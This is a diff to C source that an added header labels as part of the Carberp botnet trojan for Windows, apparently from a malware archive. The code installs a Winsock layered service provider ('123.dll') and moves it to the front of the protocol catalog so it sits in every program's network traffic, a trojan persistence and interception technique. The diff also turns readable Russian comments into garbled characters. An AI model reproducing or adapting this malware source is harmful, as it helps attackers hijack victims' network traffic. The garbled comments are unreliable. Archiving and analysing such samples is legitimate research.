@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wchar.h>
 #include <Ws2spi.h>
@@ -52,7 +63,7 @@ int main( int argc, char* argv[] )
 	if( err != WSAENOBUFS ) return 1;
 	info = (WSAPROTOCOL_INFOW*) malloc(szInfo);
 	count = WSCEnumProtocols( 0, info, &szInfo, &err );
-	//поиск базового провайдера провайдера 
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 	for( int i = 0; i < count; i++ )
 	{
 		if( info[i].iAddressFamily == AF_INET &&
@@ -89,7 +100,7 @@ int main( int argc, char* argv[] )
 	if( WSCInstallProvider( &PROVIDER_GUID, L"123.dll", &myInfo, 1, &err ) == SOCKET_ERROR )
 		return 2;
  
-	//установка цепочки вызовов
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	info = 0; szInfo = 0;
 	count = WSCEnumProtocols( 0, info, &szInfo, &err );
 	if( err != WSAENOBUFS ) return 1;
@@ -115,7 +126,7 @@ int main( int argc, char* argv[] )
 		}
 	}
 	free(info);
-	//устанавливаем порядок вызова протоколов
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	info = 0; szInfo = 0;
 	count = WSCEnumProtocols( 0, info, &szInfo, &err );
 	if( err != WSAENOBUFS ) return 1;
@@ -128,8 +139,8 @@ int main( int argc, char* argv[] )
 	{
 		for( int i = 0; i < count; i++ )
 		if( memcmp( &info[i].ProviderId, &CHAIN_GUID, sizeof(CHAIN_GUID) ) == 0 )
-			orders[i_orders++] = info[i].dwCatalogEntryId; //делаем его 1-м
-		//далее распологаем остальных провайдеров
+			orders[i_orders++] = info[i].dwCatalogEntryId; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ 1-пїЅ
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		for( int i = 0; i < count; i++ )
 			if( orders[0] != info[i].dwCatalogEntryId )
 				orders[i_orders++] = info[i].dwCatalogEntryId;
